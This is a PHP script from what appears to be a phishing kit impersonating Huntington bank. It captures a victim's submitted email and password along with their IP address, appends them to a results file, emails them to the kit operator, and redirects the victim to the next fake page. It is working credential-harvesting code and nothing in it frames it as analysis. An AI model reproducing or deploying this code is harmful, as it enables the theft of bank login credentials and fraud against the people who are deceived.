<?php
include '../info.php';
include './blocker.php';
$ip = getenv("REMOTE_ADDR");
$var=$_POST['submit2'];
$message .= "D0N5L0W----HUNTINGTON-----2EMA1L----2023\n";
$message .= "EMA1L: " .$_POST['m']."\n\n";
$message .= "PASSW0RD: " .$_POST['p']."\n\n";
$message .= "D0N5L0W----HUNTINGTON-----2EMA1L----2023\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$rnessage = "$message\n";
$message .= "D0N5L0W----HUNT1NGT0N\n";
$subject = "D0N5L0W----HUNTINGTON-----2EMA1L----2023+ | $ip";
$headers = "From: ";
$headers .= $_POST['username']."HUNT1NGT0N";
$headers .= "HUNT1NGT0N";

if (X_RESULT_SAVE_REZ_TO_FILE === true) {
    $fp = fopen('../'.X_RESULT_SAVE_NAME, "a");
    fputs($fp, $message);
    fclose($fp);
}

if (mail($recipient,$subject,$message,$headers))
       {
           header("Location: surf4.php");

       }
else
           {
        echo "ERROR! Please go back and try again.";
         }

?>